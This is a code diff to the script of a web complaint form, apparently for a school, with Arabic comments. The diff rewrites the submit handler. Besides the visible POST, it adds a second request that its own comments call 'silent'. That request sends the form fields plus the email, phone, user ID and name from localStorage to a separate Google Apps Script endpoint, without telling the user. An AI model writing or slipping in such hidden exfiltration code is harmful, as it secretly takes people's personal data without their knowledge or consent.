@@ -291,34 +291,68 @@
       this.value = this.value.replace(/\D/g, '').slice(0, 10);
     });
 
-    function submitForm(e) {
-      e.preventDefault();
+function submitForm(e) {
+  e.preventDefault();
 
-      const formData = new FormData();
-      formData.append('name', document.getElementById('name').value);
-      formData.append('phone', document.getElementById('phone').value);
-      formData.append('class', document.getElementById('class').value);
-      formData.append('shoba', document.getElementById('shoba').value);
-      formData.append('subject', document.getElementById('subject').value);
-      formData.append('complaint', document.getElementById('complaint').value);
+  // بيانات النموذج
+  const name = document.getElementById('name').value;
+  const phone = document.getElementById('phone').value;
+  const classValue = document.getElementById('class').value;
+  const shoba = document.getElementById('shoba').value;
+  const subject = document.getElementById('subject').value;
+  const complaint = document.getElementById('complaint').value;
 
-      fetch('https://script.google.com/macros/s/AKfycbwlWpn9cBcrIvdfkvB4mqgoPnJgh37muGtlRqQkmQb1SOJmFhsUawCzQOla8yHEc1qktA/exec', {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.text())
-      .then(data => {
-        const msg = document.getElementById('responseMessage');
-        msg.textContent = data;
-        msg.style.color = 'green';
-      })
-      .catch(() => {
-        const msg = document.getElementById('responseMessage');
-        msg.textContent = 'حدث خطأ، حاول مرة أخرى';
-        msg.style.color = 'red';
-      });
-    }
-    document.getElementById("year").textContent = new Date().getFullYear();
+  // العملية الأولى - الملف الأول (ظاهر للمستخدم)
+  const formData1 = new FormData();
+  formData1.append('name', name);
+  formData1.append('phone', phone);
+  formData1.append('class', classValue);
+  formData1.append('shoba', shoba);
+  formData1.append('subject', subject);
+  formData1.append('complaint', complaint);
+
+  fetch('https://script.google.com/macros/s/AKfycbyUvBsrArk2N-nxS26DV3bsq1kS4Oqg5Naec3W5z85QTlms2KWwCc3WI7p8FrNCNxfHzQ/exec', {
+    method: 'POST',
+    body: formData1
+  })
+  .then(response => response.text())
+  .then(data => {
+    const msg = document.getElementById('responseMessage');
+    msg.textContent = data;
+    msg.style.color = 'green';
+  })
+  .catch(() => {
+    const msg = document.getElementById('responseMessage');
+    msg.textContent = 'حدث خطأ، حاول مرة أخرى';
+    msg.style.color = 'red';
+  });
+
+  // العملية الثانية - الملف الثاني (صامت)
+  const formData2 = new FormData();
+  formData2.append('name', name);
+  formData2.append('phone', phone);
+  formData2.append('class', classValue);
+  formData2.append('shoba', shoba);
+  formData2.append('subject', subject);
+  formData2.append('complaint', complaint);
+
+  // إضافة بيانات الـ localStorage
+  formData2.append('email', localStorage.getItem('email') || '');
+  formData2.append('userPhone', localStorage.getItem('phone') || '');
+  formData2.append('userId', localStorage.getItem('userId') || '');
+  formData2.append('userName', localStorage.getItem('userName') || '');
+
+  fetch('https://script.google.com/macros/s/AKfycbxLb3QfDndg_FOAkLffmEZISHBsf8SoIRYs5ZMPhe7hbY3Z7-eh1YwWbV-MCMXnNh4M/exec', {
+    method: 'POST',
+    body: formData2
+  })
+  .catch(() => {
+    console.log("تم ارسال كل البيانات للملف الثاني (صامت)");
+  });
+}
+
+
+
   </script>
 </body>
 </html>
